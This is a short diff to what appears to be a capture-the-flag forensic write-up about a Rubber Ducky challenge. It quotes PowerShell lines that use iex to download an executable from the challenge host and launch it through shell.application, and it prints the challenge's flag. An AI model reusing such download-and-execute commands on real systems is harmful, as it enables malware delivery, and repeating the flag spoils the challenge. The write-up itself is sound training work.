@@ -16,6 +16,6 @@ iex (New-ObjectSystem.Net.WebClient).DownloadFile('http://challenge01.rootme.org
 iex (New-Object -com shell.application).shellexecute('666c61676765643f.exe');
 
 Go to the link http://challenge01.rootme.org/forensic/ch14/files/666c61676765643f.exe and a ".EXE" file will be downloaded.
-The code is in assembly language so disassembel it  in https://onlinedisassembler.com/ and will get a flag Flag:RubberDuckyFail3D
+Open the file in hexeditor and search for flag Flag:RubberDuckyFail3D
 
 #RubberDuckyFail3D
